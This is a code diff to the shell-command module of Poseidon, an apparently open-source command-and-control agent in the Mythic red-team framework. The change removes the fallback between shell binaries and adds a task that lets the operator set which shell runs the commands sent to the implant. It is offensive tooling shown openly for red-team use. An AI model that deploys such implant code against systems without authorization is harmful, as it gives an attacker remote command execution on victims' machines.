@@ -2,6 +2,7 @@ package shell
 
 import (
 	"bufio"
+	"encoding/json"
 	"fmt"
 	"os"
 	"os/exec"
@@ -13,20 +14,13 @@ import (
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
 )
 
+var shellBin = "/bin/bash"
+
 // Run - Function that executes the shell command
 func Run(task structs.Task) {
 	msg := task.NewResponse()
-	shellBin := "/bin/bash"
-	if _, err := os.Stat(shellBin); err != nil {
-		if _, err = os.Stat("/bin/sh"); err != nil {
-			msg.SetError("Could not find /bin/bash or /bin/sh")
-			task.Job.SendResponses <- msg
-			return
-		} else {
-			shellBin = "/bin/sh"
-		}
-	}
 	command := exec.Command(shellBin)
+
 	command.Stdin = strings.NewReader(task.Params)
 	command.Env = os.Environ()
 
@@ -118,5 +112,26 @@ func Run(task structs.Task) {
 		task.Job.SendResponses <- msg
 		return
 	}
+	return
+}
+
+type Arguments struct {
+	Shell string `json:"shell"`
+}
+
+func RunConfig(task structs.Task) {
+	msg := task.NewResponse()
+	args := Arguments{}
+	err := json.Unmarshal([]byte(task.Params), &args)
+	if err != nil {
+		msg.SetError(err.Error())
+		task.Job.SendResponses <- msg
+		return
+	}
+	shellBin = args.Shell
+	msg.Completed = true
+	msg.UserOutput = fmt.Sprintf("Shell updated")
+
+	task.Job.SendResponses <- msg
 	return
 }
